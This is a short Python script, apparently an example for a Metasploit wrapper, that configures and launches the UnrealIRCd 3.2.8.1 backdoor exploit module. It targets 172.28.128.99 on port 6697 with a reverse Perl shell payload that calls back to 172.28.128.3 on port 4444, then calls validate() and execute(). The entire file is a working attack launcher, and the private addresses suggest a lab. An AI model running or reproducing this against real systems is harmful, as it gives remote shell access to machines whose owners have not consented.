from mod import execute, validate

args = {
    "module_type": "exploit",
    "module_name": "unix/irc/unreal_ircd_3281_backdoor",
    "module_options":
        {
            "RHOSTS": "172.28.128.99",
            "RPORT": "6697"
        },
    "payload_name": "cmd/unix/reverse_perl", # optional
    "payload_options":              # optional
        {
            "LHOST": "172.28.128.3",
            "LPORT": "4444"
        },
    "run_as_job": False,           # optional
    # "session_id": "1",           # optional
    "create_named_session": "some_name", # optional
    "exploit_timeout_in_sec": 30,  # default 60
    "exploit_retries": 3,          # default 1
    "session_timeout_in_sec": 10,  # default 60
}

try:
    val_output = validate(args)
    print("validate output: " + str(val_output))
except Exception as ex:
    print(ex)

try:
    ex_output = execute(args)
    print("execute output: " + str(ex_output))
except Exception as ex:
    print(ex)
